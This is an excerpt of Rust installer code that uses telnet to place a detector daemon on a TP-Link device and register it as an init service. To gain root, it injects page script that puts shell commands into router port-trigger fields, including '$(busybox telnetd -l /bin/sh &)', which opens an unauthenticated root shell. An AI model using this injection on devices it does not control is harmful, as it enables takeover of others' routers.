...
async fn tplink_run_install(
    ...
    if skip_sdcard {
        sdcard_path = "/data/vncssdetector-data".to_owned();
        telnet_send_command(
            addr,
        ...
        if sdcard_path.is_empty() {
            ...
            if sdcard_path.is_empty() {
                anyhow::bail!(
                    "Unable to determine sdcard path. VNCSSdetector needs a FAT-formatted SD card to function.\n\n\
        ...
        .is_err()
        {
            telnet_send_command(addr, &format!("mount /dev/mmcblk0p1 {sdcard_path}"), "exit code 0", true).await.context("VNCSSdetector needs a FAT-formatted SD card to function for more than a few minutes. Insert one and rerun this installer, or pass --skip-sdcard")?;
        } else {
    ...
    telnet_send_command(addr, "rm -rf /data/vncssdetector", "exit code 0", true).await?;
    telnet_send_command(addr, "mkdir -p /data", "exit code 0", true).await?;
    telnet_send_command(
        addr,
        &format!("ln -sf {sdcard_path} /data/vncssdetector"),
        "exit code 0",
        true,
    )
    .await?;
    ...
    let vncssdetector_daemon_bin = include_bytes!(env!("FILE_VNCSSDETECTOR_DAEMON"));

    telnet_send_file(
        addr,
        &format!("{sdcard_path}/vncssdetector-daemon"),
        vncssdetector_daemon_bin,
        true,
    )
    .await?;
    ...
    telnet_send_file(
        addr,
        "/etc/init.d/vncssdetector_daemon",
        get_vncssdetector_daemon(&sdcard_path).as_bytes(),
        true,
    )
    .await?;
    ...
    telnet_send_command(
        addr,
        &format!("chmod ugo+x {sdcard_path}/vncssdetector-daemon"),
        "exit code 0",
        true,
    )
    .await?;
    telnet_send_command(
        addr,
        "chmod 755 /etc/init.d/vncssdetector_daemon",
        "exit code 0",
        true,
    )
    .await?;

    // if the device is not v3, the JS-based root exploit already added vncssdetector_daemon as a
    ...
    if is_v3 {
        telnet_send_command(
            addr,
            "update-rc.d vncssdetector_daemon defaults",
            "exit code 0",
            true,
        )
        .await?;
...
async fn handler(state: State<AppState>, mut req: Request) -> Result<Response, StatusCode> {
    ...
    *req.uri_mut() = Uri::try_from(uri).unwrap();
    ...
    if is_settings_js {
        ...
        console.log("vncssdetector: start polling");

        var vncssdetectorSleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

        var vncssdetectorPoll = window.setInterval(async () => {
            Globals.models.PTModel.add({applicationName: "vncssdetector-daemon", enableState: 1, entryId: 1, openPort: "2401", openProtocol: "TCP", triggerPort: "$(/etc/init.d/vncssdetector_daemon start &)", triggerProtocol: "TCP"});
            console.log("vncssdetector: first request succeeded, stopping vncssdetector poll loop");
            window.clearInterval(vncssdetectorPoll);
            ...
            await vncssdetectorSleep(1000);

            console.log("vncssdetector: running second request");
            Globals.models.PTModel.add({applicationName: "vncssdetector-root", enableState: 1, entryId: 2, openPort: "2402", openProtocol: "TCP", triggerPort: "$(busybox telnetd -l /bin/sh &)", triggerProtocol: "TCP"});
            ...
            document.body.innerHTML = "<h1>Success! You can go back to the vncssdetector installer.</h1>";
        }, 1000);
        });"#);
...
fn get_vncssdetector_daemon(sdcard_path: &str) -> String {
    ...
    crate::VNCSSdetector_DAEMON_INIT.replace(
...
#[test]
fn test_get_vncssdetector_daemon() {
    let s = get_vncssdetector_daemon("/media/card");
